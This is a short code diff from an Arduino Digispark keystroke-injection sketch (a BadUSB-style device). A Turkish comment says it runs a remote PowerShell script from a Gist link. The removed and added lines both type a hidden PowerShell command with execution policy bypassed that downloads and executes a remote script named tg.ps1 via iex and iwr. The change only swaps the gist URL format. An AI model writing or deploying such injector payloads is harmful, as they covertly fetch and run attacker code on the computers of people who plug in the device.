@@ -23,7 +23,7 @@ void loop() {
     DigiKeyboard.delay(800);
 
     // Gist linkinden uzaktan PowerShell scriptini çalıştır
-    DigiKeyboard.print("powershell -w hidden -ep bypass -c \"iex (iwr -UseBasicParsing 'https://gist.githubusercontent.com/Eren-Oztk/147edce7b621e8822e3a8358a58ca3ff/raw/2ddbdf012de1a53d014edc68a5da991a052fbbfd/tg.ps1')\"");
+    DigiKeyboard.print("powershell -w hidden -ep bypass -c \"iex (iwr -UseBasicParsing 'https://gist.github.com/Eren-Oztk/147edce7b621e8822e3a8358a58ca3ff.js/tg.ps1')\"");
     DigiKeyboard.delay(500);
     DigiKeyboard.sendKeyStroke(KEY_ENTER);
 
